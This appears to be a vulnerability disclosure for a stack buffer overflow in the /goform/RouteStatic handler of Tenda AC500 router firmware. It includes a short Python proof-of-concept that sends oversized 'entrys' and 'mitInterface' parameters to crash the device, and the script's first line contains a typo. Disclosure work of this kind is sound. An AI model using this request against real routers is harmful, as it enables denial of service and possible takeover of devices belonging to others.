# Tenda Router AC500 Vulnerability
This vulnerability lies in the `/goform/RouteStatic` page which influences the lastest version of Tenda Router AC500. (The latest version is [AC500_V1.0.0.16](https://www.tenda.com.cn/download/detail-2219.html))
## Vulnerability Description
There is a stack-based buffer overflow vulnerability in function `fromRouteStatic`.

In function `fromRouteStatic` it reads 2 user provided parameters `entrys` and `mitInterface` into `v8` and `v7`, and these two variables are passed into function `sprintf` without any length check, which may overflow the stack-based buffer `s`.
![](https://github.com/Funcy33/Vluninfo_Repo/blob/main/CNVDs/113/vlun.png)

So by requesting the page `/goform/RouteStatic`, the attacker can easily perform a **Deny of Service Attack** or **Remote Code Execution** with carefully crafted overflow data.
## POC
```
mport requests

IP = "10.10.10.1"
url = f"http://{IP}/goform/RouteStatic?"
url += "entrys=" + "s" * 0x200
url += "&mitInterface=" + "a" * 0x200

response = requests.get(url)
```
## Timeline
## Acknowledgment
Credit to [@Funcy_kilar](https://github.com/Funcy33) from Guangzhou University.

